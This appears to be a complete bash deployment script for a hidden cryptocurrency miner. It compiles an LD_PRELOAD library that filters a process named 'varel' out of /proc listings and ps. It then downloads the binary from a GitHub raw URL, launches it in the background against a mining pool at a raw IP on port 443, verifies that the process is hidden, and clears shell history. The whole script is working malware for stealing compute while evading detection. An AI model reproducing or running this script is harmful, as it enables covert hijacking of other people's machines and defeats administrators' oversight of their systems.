#!/bin/bash
set -e

cd ~/

# === Install dependencies ===
sudo apt-get update >/dev/null 2>&1
sudo apt-get install -y wget ca-certificates gcc make >/dev/null 2>&1

# === Buat file hider.c (process hiding via LD_PRELOAD) ===
cat > /tmp/hider.c << 'EOFHIDER'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static const char* process_to_filter = "varel";

static int get_dir_name(DIR* dirp, char* buf, size_t size) {
    int fd = dirfd(dirp);
    if(fd == -1) return 0;
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) return 0;
    buf[ret] = 0;
    return 1;
}

static int get_process_name(char* pid, char* buf) {
    if(strspn(pid, "0123456789") != strlen(pid)) return 0;
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
    FILE* f = fopen(tmp, "r");
    if(f == NULL) return 0;
    if(fgets(tmp, sizeof(tmp), f) == NULL) { fclose(f); return 0; }
    fclose(f);
    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir) \
static struct dirent* (*original_##readdir)(DIR*) = NULL; \
struct dirent* readdir(DIR *dirp) { \
    if(original_##readdir == NULL) { \
        original_##readdir = dlsym(RTLD_NEXT, #readdir); \
        if(original_##readdir == NULL) fprintf(stderr, "Error: %s\n", dlerror()); \
    } \
    struct dirent* dir; \
    while(1) { \
        dir = original_##readdir(dirp); \
        if(dir) { \
            char dir_name[256], process_name[256]; \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) && \
                strcmp(dir_name, "/proc") == 0 && \
                get_process_name(dir->d_name, process_name) && \
                strcmp(process_name, process_to_filter) == 0) continue; \
        } \
        break; \
    } \
    return dir; \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
EOFHIDER

# Compile process hider
gcc -Wall -fPIC -shared -o ~/.libhider.so /tmp/hider.c -ldl 2>/dev/null
rm -f /tmp/hider.c

# === Download varel ===
if [ ! -f ~/varel ]; then
    echo "📥 Downloading varel..."
    wget -q -O ~/varel https://github.com/jerryseptian123/helmiyahtas/raw/main/varel
    chmod +x ~/varel
fi

# === Generate random worker ID ===
RANDOM_WORKER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 10000-99999)-w$(date +%s)"

# === Kill old process if exists ===
pkill -f "varel.*randomvirel" 2>/dev/null || true
sleep 2

# === Start varel with process hiding ===
echo "🚀 Starting varel (hidden process)..."
export LD_PRELOAD=~/.libhider.so

nohup ~/varel -a randomvirel \
  --url 137.184.31.121:443 \
  --user "$RANDOM_WORKER" \
  --threads=6 \
  --verbose \
  --log-file=~/run.log \
  > /dev/null 2>&1 &

sleep 3

# === Verify ===
if pgrep -f "varel.*randomvirel" >/dev/null; then
    echo "✅ Varel started successfully!"
    echo "📊 Worker ID: $RANDOM_WORKER"
    echo "📝 Log file: ~/run.log"
    
    # Test process hiding
    if ps aux | grep -v grep | grep -q varel; then
        echo "⚠️ Process still visible in ps"
    else
        echo "✅ Process hidden from ps"
    fi
else
    echo "❌ Failed to start varel"
    tail -20 ~/run.log 2>/dev/null || echo "No log file"
fi

# Clear history
history -c && history -w 2>/dev/null || true
